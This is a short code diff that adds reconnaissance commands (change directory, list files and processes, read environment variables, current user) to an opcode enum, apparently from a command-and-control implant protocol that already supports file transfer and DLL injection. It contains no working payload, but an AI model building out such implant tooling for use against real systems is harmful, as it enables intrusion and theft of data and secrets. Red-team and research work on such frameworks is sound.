@@ -11,6 +11,12 @@ class Opcodes(Enum):
     DOWNLOAD = 0x06  # Download a file from the implant to the server
     UPLOAD = 0x07  # Upload a file from the server to the implant
     INJECT = 0x08  # Inject a DLL into a process
+    CHDIR = 0x09  # Change the implant's working directory
+    PWD = 0x0A  # Get the implant's working directory
+    GETENV = 0x0B  # Get all environment variables
+    LS = 0x0C  # List files in a directory
+    PS = 0x0D  # List running processes
+    WHOAMI = 0x0E  # Get the current user
 
     def __str__(self):
         return self.name
